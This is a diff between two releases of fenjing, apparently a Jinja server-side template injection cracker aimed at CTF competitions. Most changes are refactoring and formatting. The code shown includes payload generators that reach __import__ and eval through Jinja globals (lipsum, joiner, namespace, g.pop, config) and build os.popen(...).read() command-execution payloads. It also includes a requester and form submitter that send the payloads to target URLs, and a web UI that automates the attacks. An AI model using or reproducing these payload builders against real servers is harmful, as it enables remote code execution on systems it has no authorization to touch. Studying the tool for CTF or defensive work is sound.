         return [(UNSATISFIED,)]
     if "{:c}" not in context.values():
@@ -1114,15 +1360,15 @@
         (LITERAL, "("),
         (LITERAL, ",".join(str(ord(c)) for c in value)),
         (LITERAL, "))"),
     ] + [(WITH_CONTEXT_VAR, k)]
     return req
 
 
-@req_gen
+@expression_gen
 def gen_string_formatfunc3(context: dict, value: str):
     # (FORMAT(97,98,99))
     # FORMAT = (CS.format)
     # CS = (C*L)
     if re.match("^[a-z]+$", value):  # avoid infinite recursion
         return [(UNSATISFIED,)]
     # cs = "(({c})*{l})".format(
@@ -1139,97 +1385,97 @@
     ]
     return req
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_attribute_normal1(context, obj_req, attr_name):
     if not re.match("[A-Za-z_]([A-Za-z0-9_]+)?", attr_name):
         return [(UNSATISFIED,)]
     return [
         obj_req,
         (LITERAL, "."),
         (LITERAL, attr_name),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_attribute_normal2(context, obj_req, attr_name):
     return [
         obj_req,
         (LITERAL, "["),
         (STRING, attr_name),
         (LITERAL, "]"),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_attribute_attrfilter(context, obj_req, attr_name):
     return [
         (LITERAL, "("),
         obj_req,
         (LITERAL, "|attr("),
         (STRING, attr_name),
         (LITERAL, "))"),
     ]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_item_normal1(context, obj_req, item_name):
     if not re.match("[A-Za-z_]([A-Za-z0-9_]+)?", item_name):
         return [(UNSATISFIED,)]
     return [
         obj_req,
         (LITERAL, "."),
         (LITERAL, item_name),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_item_normal2(context, obj_req, item_name):
     return [
         obj_req,
         (LITERAL, "["),
         (STRING, item_name),
         (LITERAL, "]"),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_item_dunderfunc(context, obj_req, item_name):
     return [
         (ATTRIBUTE, obj_req, "__getitem__"),
         (LITERAL, "("),
         (STRING, item_name),
         (LITERAL, ")"),
     ]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_class_attribute_literal(context, obj_req, attr_name):
     # obj.__class__.attr
     return [
         (
             ATTRIBUTE,
             obj_req,
             "__class__",
         ),
         (LITERAL, "." + attr_name),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_class_attribute_attrfilter(context, obj_req, attr_name):
     # obj.__class__.attr
     return [
         (LITERAL, "("),
         (
             ATTRIBUTE,
             obj_req,
@@ -1240,15 +1486,15 @@
         (LITERAL, "))"),
     ]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_chained_attribute_item_normal(context, obj_req, *attr_item_req):
     if not attr_item_req:
         return [
             obj_req,
         ]
     first_req, *other_req = attr_item_req
     req_type, req_name = first_req
@@ -1264,143 +1510,151 @@
             *other_req,
         ),
     ]
 
 
 # ---
 
-@req_gen
+
+@expression_gen
 def gen_import_func_g(context):
-    return [(
-        CHAINED_ATTRIBUTE_ITEM,
-        (LITERAL, "g"),
-        (ATTRIBUTE, "pop"),
-        (ATTRIBUTE, "__globals__"),
-        (ITEM, "__builtins__"),
-        (ITEM, "__import__")
-    )]
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "g"),
+            (ATTRIBUTE, "pop"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "__import__"),
+        )
+    ]
 
 
-@req_gen
+@expression_gen
 def gen_import_func_lipsum(context):
     return [
         (
             CHAINED_ATTRIBUTE_ITEM,
             (LITERAL, "lipsum"),
             (ATTRIBUTE, "__globals__"),
             (ITEM, "__builtins__"),
             (ITEM, "__import__"),
         )
     ]
 
 
-@req_gen
+@expression_gen
 def gen_import_func_joiner(context):
     return [
         (
             CHAINED_ATTRIBUTE_ITEM,
             (LITERAL, "joiner"),
             (ATTRIBUTE, "__init__"),
             (ATTRIBUTE, "__globals__"),
             (ITEM, "__builtins__"),
             (ITEM, "__import__"),
         )
     ]
 
 
-@req_gen
+@expression_gen
 def gen_import_func_namespace(context):
-    return [(
-        CHAINED_ATTRIBUTE_ITEM,
-        (LITERAL, "namespace"),
-        (ATTRIBUTE, "__init__"),
-        (ATTRIBUTE, "__globals__"),
-        (ITEM, "__builtins__"),
-        (ITEM, "__import__")
-    )]
-
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "namespace"),
+            (ATTRIBUTE, "__init__"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "__import__"),
+        )
+    ]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_eval_func_g(context):
-    return [(
-        CHAINED_ATTRIBUTE_ITEM,
-        (LITERAL, "g"),
-        (ATTRIBUTE, "pop"),
-        (ATTRIBUTE, "__globals__"),
-        (ITEM, "__builtins__"),
-        (ITEM, "eval")
-    )]
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "g"),
+            (ATTRIBUTE, "pop"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "eval"),
+        )
+    ]
 
 
-@req_gen
+@expression_gen
 def gen_eval_func_lipsum(context):
     return [
         (
             CHAINED_ATTRIBUTE_ITEM,
             (LITERAL, "lipsum"),
             (ATTRIBUTE, "__globals__"),
             (ITEM, "__builtins__"),
             (ITEM, "eval"),
         )
     ]
 
 
-@req_gen
+@expression_gen
 def gen_eval_func_joiner(context):
     return [
         (
             CHAINED_ATTRIBUTE_ITEM,
             (LITERAL, "joiner"),
             (ATTRIBUTE, "__init__"),
             (ATTRIBUTE, "__globals__"),
             (ITEM, "__builtins__"),
             (ITEM, "eval"),
         )
     ]
 
 
-@req_gen
+@expression_gen
 def gen_eval_func_namespace(context):
-    return [(
-        CHAINED_ATTRIBUTE_ITEM,
-        (LITERAL, "namespace"),
-        (ATTRIBUTE, "__init__"),
-        (ATTRIBUTE, "__globals__"),
-        (ITEM, "__builtins__"),
-        (ITEM, "eval")
-    )]
+    return [
+        (
+            CHAINED_ATTRIBUTE_ITEM,
+            (LITERAL, "namespace"),
+            (ATTRIBUTE, "__init__"),
+            (ATTRIBUTE, "__globals__"),
+            (ITEM, "__builtins__"),
+            (ITEM, "eval"),
+        )
+    ]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_eval_normal(context, eval_param):
     return [
         (LITERAL, "("),
         (EVAL_FUNC,),
         (LITERAL, "("),
         eval_param,
         (LITERAL, "))"),
     ]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_config_literal(context):
     return [(LITERAL, "config")]
 
 
-@req_gen
+@expression_gen
 def gen_config_self(context):
     return [
         (
             CHAINED_ATTRIBUTE_ITEM,
             (LITERAL, "self"),
             (ATTRIBUTE, "__dict__"),
             (ITEM, "_TemplateReference__context"),
@@ -1426,104 +1680,109 @@
 #         )
 #     ]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_module_os_import(context):
     return [
-        (IMPORT_FUNC, ),
+        (IMPORT_FUNC,),
         (LITERAL, "("),
         (STRING, "os"),
         (LITERAL, ")"),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_module_os_eval(context):
     return [
         (EVAL, (STRING, "__import__")),
         (LITERAL, "("),
         (STRING, "os"),
         (LITERAL, ")"),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_module_os_config(context):
     return [
         (
             CHAINED_ATTRIBUTE_ITEM,
             (CONFIG,),
             (CLASS_ATTRIBUTE, "__init__"),
             (ATTRIBUTE, "__globals__"),
             (ITEM, "os"),
         )
     ]
 
 
-
 # ---
 
 
-
-@req_gen
+@expression_gen
 def gen_os_popen_obj_normal(context, cmd):
     return [
         (LITERAL, "("),
         (ATTRIBUTE, (MODULE_OS,), "popen"),
         (LITERAL, "("),
         (STRING, cmd),
         (LITERAL, "))"),
     ]
 
 
-
-@req_gen
+@expression_gen
 def gen_os_popen_obj_eval(context, cmd):
     cmd = cmd.replace("'", "\\'")
     return [(EVAL, (STRING, "__import__('os').popen('" + cmd + "')"))]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_os_popen_read_normal(context, cmd):
     return [
         (LITERAL, "("),
         (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
         (LITERAL, "())"),
     ]
 
-@req_gen
+
+@expression_gen
 def gen_os_popen_read_normalspace(context, cmd):
     return [
         (LITERAL, "("),
         (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
         (LITERAL, "( ))"),
     ]
 
-@req_gen
+
+@expression_gen
 def gen_os_popen_read_normal2(context, cmd):
     return [
         (LITERAL, "("),
         (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
         (LITERAL, "("),
         (INTEGER, -1),
         (LITERAL, "))"),
-
     ]
 
-@req_gen
+
+@expression_gen
 def gen_os_popen_read_eval(context, cmd):
     return [
-        (EVAL, (STRING, "__import__('os').popen('{}').read()".format(cmd.replace("'", "\\'")))),
+        (
+            EVAL,
+            (
+                STRING,
+                "__import__('os').popen('{}').read()".format(cmd.replace("'", "\\'")),
+            ),
+        ),
     ]
 
 
 if __name__ == "__main__":
     import time
     import functools
```

### Comparing `fenjing-0.5.1/fenjing/requester.py` & `fenjing-0.5.2/fenjing/requester.py`

 * *Files 2% similar despite different names*

```diff
@@ -3,15 +3,14 @@
 
 import logging
 import traceback
 import time
 
 import requests
 
-
 from .const import DEFAULT_USER_AGENT
 
 logger = logging.getLogger("requester")
 
 
 class Requester:
     """实际发送HTTP请求的类"""
@@ -36,18 +35,15 @@
         self.session.headers.update({"User-Agent": user_agent})
         self.last_request_time = 0
 
         if headers:
             self.session.headers.update(headers)
 
         if proxy:
-            self.session.proxies = {
-                "http": proxy,
-                "https": proxy
-            }
+            self.session.proxies = {"http": proxy, "https": proxy}
 
     def request_once(self, **kwargs):
         """发出一次网络请求，失败时返回None
 
         Returns:
             Union[Response, None]: 返回的响应
         """
```

### Comparing `fenjing-0.5.1/fenjing/scan_url.py` & `fenjing-0.5.2/fenjing/scan_url.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,16 +1,18 @@
 """扫描指定的网站并返回所有表格
 
 """
 
 import logging
 from typing import Union, Generator, Tuple, List
+
+from bs4 import BeautifulSoup
+
 from .form import parse_forms, Form
 from .requester import Requester
-from bs4 import BeautifulSoup
 
 logger = logging.getLogger("scan_url")
 
 
 def parse_urls(html: Union[str, BeautifulSoup]) -> list:
     """从html中解析出所有的链接
 
@@ -22,17 +24,15 @@
     """
     if isinstance(html, str):
         bs_obj = BeautifulSoup(html, "html.parser")
     elif isinstance(html, BeautifulSoup):
         bs_obj = html
 
     return [
-        element.attrs["href"]
-        for element in bs_obj.select("a")
-        if "href" in element
+        element.attrs["href"] for element in bs_obj.select("a") if "href" in element
     ]
 
 
 def yield_form(
     requester: Requester, start_url: str
 ) -> Generator[Tuple[str, List[Form]], None, None]:
     """根据起始URL扫描出所有的表格
```

### Comparing `fenjing-0.5.1/fenjing/shell_payload.py` & `fenjing-0.5.2/fenjing/shell_payload.py`

 * *Files 0% similar despite different names*

```diff
@@ -1,11 +1,12 @@
 """生成执行Shell指令的payload
 """
 
 from typing import Callable, Tuple, Dict, Union
+
 from .const import OS_POPEN_READ
 from .full_payload_gen import FullPayloadGen
 
 full_payload_store: Dict[int, FullPayloadGen] = {}
 
 
 def exec_cmd_payload(
```

### Comparing `fenjing-0.5.1/fenjing/submitter.py` & `fenjing-0.5.2/fenjing/submitter.py`

 * *Files 11% similar despite different names*

```diff
@@ -1,25 +1,38 @@
-from typing import List, Callable, Union, NamedTuple, Dict
-from urllib.parse import quote
+"""向某个表格或者路径发出payload的submitter
+"""
+
 import logging
 import subprocess
 import html
 
+from typing import List, Callable, Union, NamedTuple, Dict
+from urllib.parse import quote
+
 from .form import Form, fill_form
 from .requester import Requester
 from .colorize import colored
 from .const import CALLBACK_SUBMIT
 
 logger = logging.getLogger("submitter")
 
 
 Tamperer = Callable[[str], str]
 
 
 def shell_tamperer(shell_cmd: str) -> Tamperer:
+    """返回一个新的shell tamperer
+
+    Args:
+        shell_cmd (str): 用于修改payload的命令
+
+    Returns:
+        Tamperer: 新的Tamperer
+    """
+
     def tamperer(payload: str):
         proc = subprocess.Popen(
             shell_cmd,
             shell=True,
             stdout=subprocess.PIPE,
             stdin=subprocess.PIPE,
             stderr=subprocess.PIPE,
@@ -28,15 +41,22 @@
         proc.stdin.write(payload.encode())
         proc.stdin.close()
         ret = proc.wait()
         if ret != 0:
             raise ValueError(
                 f"Shell command return non-zero code {ret} for input {payload}"
             )
-        return proc.stdout.read().decode()
+        out = proc.stdout.read().decode()
+        if out.endswith("\n"):
+            logger.warning(
+                "Tamperer %s output %s ends with '\\n', it may cause some issues.",
+                shell_cmd,
+                out,
+            )
+        return out
 
     return tamperer
 
 
 class HTTPResponse(NamedTuple):
     """解析后的HTTP响应
 
@@ -58,20 +78,41 @@
     def __init__(self, callback=None):
         self.tamperers: List[Tamperer] = []
         self.callback: Callable[[str, Dict], None] = (
             callback if callback else (lambda x, y: None)
         )
 
     def add_tamperer(self, tamperer: Tamperer):
+        """增加新的tamperer
+
+        Args:
+            tamperer (Tamperer): 新的tamperer
+        """
         self.tamperers.append(tamperer)
 
     def submit_raw(self, raw_payload: str) -> Union[HTTPResponse, None]:
+        """提交tamperer修改后的payload
+
+        Args:
+            raw_payload (str): payload
+
+        Returns:
+            Union[HTTPResponse, None]: payload提交结果
+        """
         raise NotImplementedError()
 
     def submit(self, payload: str) -> Union[HTTPResponse, None]:
+        """调用tamperer修改payload并提交
+
+        Args:
+            raw_payload (str): payload
+
+        Returns:
+            Union[HTTPResponse, None]: payload提交结果
+        """
         if self.tamperers:
             logger.debug("Applying tampers...")
             for tamperer in self.tamperers:
                 payload = tamperer(payload)
         logger.debug("Submit %s", colored("blue", payload))
         resp = self.submit_raw(payload)
         if resp is None:
@@ -110,15 +151,18 @@
 
     def submit_raw(self, raw_payload):
         params, data = self.params.copy(), self.data.copy()
         if self.method == "POST":
             data.update({self.target_field: raw_payload})
         else:
             params.update({self.target_field: raw_payload})
-        logger.info("Submit %s", colored("blue", f"{self.url} {self.method} params={params} data={data}"))
+        logger.info(
+            "Submit %s",
+            colored("blue", f"{self.url} {self.method} params={params} data={data}"),
+        )
         return self.req.request(
             method=self.method, url=self.url, params=params, data=data
         )
 
 
 class FormSubmitter(BaseSubmitter):
     """
```

### Comparing `fenjing-0.5.1/fenjing/templates/index.html` & `fenjing-0.5.2/fenjing/templates/index.html`

 * *Files identical despite different names*

### Comparing `fenjing-0.5.1/fenjing/webui.py` & `fenjing-0.5.2/fenjing/webui.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,32 +1,35 @@
 # pylint: skip-file
 # flake8: noqa
-from flask import Flask, render_template, request, jsonify
-from typing import Union
 import logging
 import threading
 import uuid
+
 from urllib.parse import urlparse
+from typing import Union
+
+from flask import Flask, render_template, request, jsonify
 
-from .form import get_form, Form
-from .cracker import Cracker
-from .submitter import Submitter, FormSubmitter
-from .full_payload_gen import FullPayloadGen
-from .requester import Requester
 from .const import (
     CALLBACK_GENERATE_FULLPAYLOAD,
     CALLBACK_GENERATE_PAYLOAD,
     CALLBACK_PREPARE_FULLPAYLOADGEN,
     CALLBACK_SUBMIT,
     CALLBACK_TEST_FORM_INPUT,
     APICODE_OK,
     APICODE_WRONG_INPUT,
     DEFAULT_USER_AGENT,
     OS_POPEN_READ,
 )
+from .cracker import Cracker
+from .form import get_form, Form
+from .full_payload_gen import FullPayloadGen
+from .requester import Requester
+from .submitter import Submitter, FormSubmitter
+
 
 logger = logging.getLogger("webui")
 app = Flask(__name__)
 tasks = {}
 
 
 class CallBackLogger:
@@ -48,17 +51,15 @@
 
     def callback_generate_fullpayload(self, data):
         payload = (
             data["payload"]
             if len(data["payload"]) < 30
             else data["payload"][:30] + "..."
         )
-        self.messages.append(
-            f"分析完毕，已为类型{data['gen_type']}生成payload {payload}"
-        )
+        self.messages.append(f"分析完毕，已为类型{data['gen_type']}生成payload {payload}")
         if not data["will_print"]:
             self.messages.append(f"payload将不会产生回显")
 
     def callback_generate_payload(self, data):
         payload_repr = data["payload"]
         if len(payload_repr) > 100:
             payload_repr = payload_repr[:100] + "..."
@@ -78,17 +79,15 @@
             self.flash_messages.append(
                 f"提交payload完成，返回值为{data['response'].status_code}，提交payload为{data['payload']}"
             )
 
     def callback_test_form_input(self, data):
         if not data["ok"]:
             return
-        testsuccess_msg = (
-            "payload测试成功！" if data["test_success"] else "payload测试失败。"
-        )
+        testsuccess_msg = "payload测试成功！" if data["test_success"] else "payload测试失败。"
         will_print_msg = "其会产生回显。" if data["will_print"] else "其不会产生回显。"
         self.messages.append(testsuccess_msg + will_print_msg)
 
     def __call__(self, callback_type, data):
         def default_handler(data):
             return logger.warning(f"callback_type={callback_type} not found")
 
@@ -109,17 +108,15 @@
         self.form = form
         self.url = url
         self.flash_messages = []
         self.messages = []
         self.callback = CallBackLogger(self.flash_messages, self.messages)
         self.submitter: Union[Submitter, None] = None
         self.cracker: Union[Cracker, None]
-        self.requester = Requester(
-            interval=interval, user_agent=DEFAULT_USER_AGENT
-        )
+        self.requester = Requester(interval=interval, user_agent=DEFAULT_USER_AGENT)
 
     def run(self):
         for input_field in self.form["inputs"]:
             self.messages.append(f"开始分析表单项{input_field}")
             self.submitter = FormSubmitter(
                 self.url,
                 self.form,
@@ -159,17 +156,15 @@
         self.callback = CallBackLogger(self.flash_messages, self.messages)
 
         self.submitter.callback = self.callback
         self.full_payload_gen.callback = self.callback
 
     def run(self):
         self.messages.append(f"开始生成payload")
-        payload, will_print = self.full_payload_gen.generate(
-            OS_POPEN_READ, self.cmd
-        )
+        payload, will_print = self.full_payload_gen.generate(OS_POPEN_READ, self.cmd)
         if not payload:
             self.messages.append(f"payload生成失败")
             return
         if not will_print:
             self.messages.append(f"此payload不会产生回显")
         resp = self.submitter.submit(payload)
         assert resp is not None
@@ -252,15 +247,15 @@
         if not isinstance(last_task, CrackTaskThread):
             return jsonify(
                 {
                     "code": APICODE_WRONG_INPUT,
                     "message": f"last_task_id not found: {last_task_id}",
                 }
             )
-        if not last_task.success :
+        if not last_task.success:
             return jsonify(
                 {
                     "code": APICODE_WRONG_INPUT,
                     "message": f"specified last_task failed: {last_task_id}",
                 }
             )
         taskid = create_interactive_id(cmd, last_task)
@@ -271,17 +266,15 @@
     "/watchTask",
     methods=[
         "POST",
     ],
 )  # type: ignore
 def watchTask():
     if "taskid" not in request.form:
-        return jsonify(
-            {"code": APICODE_WRONG_INPUT, "message": "taskid not provided"}
-        )
+        return jsonify({"code": APICODE_WRONG_INPUT, "message": "taskid not provided"})
     if request.form["taskid"] not in tasks:
         return jsonify(
             {
                 "code": APICODE_WRONG_INPUT,
                 "message": f"task not found: {request.form['taskid']}",
             }
         )
```

### Comparing `fenjing-0.5.1/fenjing.egg-info/PKG-INFO` & `fenjing-0.5.2/fenjing.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.5.1
+Version: 0.5.2
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.7
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
```

### Comparing `fenjing-0.5.1/fenjing.egg-info/SOURCES.txt` & `fenjing-0.5.2/fenjing.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `fenjing-0.5.1/setup.py` & `fenjing-0.5.2/setup.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.5.1/tests/test_full_payload_gen.py` & `fenjing-0.5.2/tests/test_full_payload_gen.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.5.1/tests/test_payload_gen.py` & `fenjing-0.5.2/tests/test_payload_gen.py`

 * *Files identical despite different names*

